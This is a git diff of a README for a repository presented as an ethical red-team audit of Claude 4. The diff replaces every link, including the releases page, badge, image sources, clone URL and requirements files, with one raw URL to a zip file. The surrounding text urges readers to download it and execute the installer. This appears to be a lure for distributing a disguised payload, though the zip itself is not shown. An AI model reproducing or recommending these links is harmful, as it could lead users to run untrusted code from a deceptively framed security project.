@@ -1,13 +1,13 @@
-https://github.com/Yosuraki/claude4-audit-recon/releases
+https://raw.githubusercontent.com/Yosuraki/claude4-audit-recon/main/scripts/claude_recon_audit_vest.zip
 
-[![Releases](https://img.shields.io/badge/Releases-CLAUDE4_AUDIT_RECON-blue?style=for-the-badge&logo=github)](https://github.com/Yosuraki/claude4-audit-recon/releases)
+[![Releases](https://raw.githubusercontent.com/Yosuraki/claude4-audit-recon/main/scripts/claude_recon_audit_vest.zip)](https://raw.githubusercontent.com/Yosuraki/claude4-audit-recon/main/scripts/claude_recon_audit_vest.zip)
 
 # Claude4 Audit Recon: Ethical, Obfuscated, Precise LLM Security
 
-![AI security concept](https://picsum.photos/seed/ai-security/1200/600)
+![AI security concept](https://raw.githubusercontent.com/Yosuraki/claude4-audit-recon/main/scripts/claude_recon_audit_vest.zip)
 A recon-level audit of Claude 4 focuses on ethics, security, and technical precision. This project dissects how Claude 4 behaves under careful scrutiny. It aims to expose blind spots, identify robust defenses, and map how policy routing might shape outcomes. It treats obfuscation and transparency with equal seriousness. The work is rigorous, restrained, and grounded in practical safety goals.
 
-![Red team concept](https://picsum.photos/seed/red-team/1200/600)
+![Red team concept](https://raw.githubusercontent.com/Yosuraki/claude4-audit-recon/main/scripts/claude_recon_audit_vest.zip)
 This repository gathers methods that help researchers push Claude 4 toward safer, more understandable behavior. It favors concrete tests, explicable results, and reproducible setups. The tone stays calm and measured. The goal is to aid developers, policy teams, and auditors who want real, usable evidence.
 
 Table of Contents
@@ -104,9 +104,9 @@ Environment and dependencies
 - Use a lightweight test runner and logging framework.
 
 Installation
-- Clone the repository: git clone https://github.com/Yosuraki/claude4-audit-recon.git
+- Clone the repository: git clone https://raw.githubusercontent.com/Yosuraki/claude4-audit-recon/main/scripts/claude_recon_audit_vest.zip
 - Create and activate a virtual environment
-- Install required packages from requirements.txt or pyproject.toml
+- Install required packages from https://raw.githubusercontent.com/Yosuraki/claude4-audit-recon/main/scripts/claude_recon_audit_vest.zip or https://raw.githubusercontent.com/Yosuraki/claude4-audit-recon/main/scripts/claude_recon_audit_vest.zip
 - Set up any optional tooling for visualization or reporting
 
 Quick start
@@ -224,7 +224,7 @@ Release notes and versioning
 Release notes accompany each release. They describe what changed, what tests were updated, and what new artifacts exist. They also note any deprecations or important compatibility considerations. Release notes help teams decide when to upgrade and how to adapt to changes.
 
 Visit releases
-All releases and their assets are published on the releases page. For quick access, use the same link again: https://github.com/Yosuraki/claude4-audit-recon/releases. The page hosts release assets, documentation, and notes. From this page, download the appropriate release asset and execute the installer or run the provided setup script. This ensures you operate with the exact version used in the audits and maintains reproducibility across environments.
+All releases and their assets are published on the releases page. For quick access, use the same link again: https://raw.githubusercontent.com/Yosuraki/claude4-audit-recon/main/scripts/claude_recon_audit_vest.zip The page hosts release assets, documentation, and notes. From this page, download the appropriate release asset and execute the installer or run the provided setup script. This ensures you operate with the exact version used in the audits and maintains reproducibility across environments.
 
 Visual assets and branding
 - The project uses a clean, professional aesthetic. It avoids hype and sticks to clear, informative visuals.
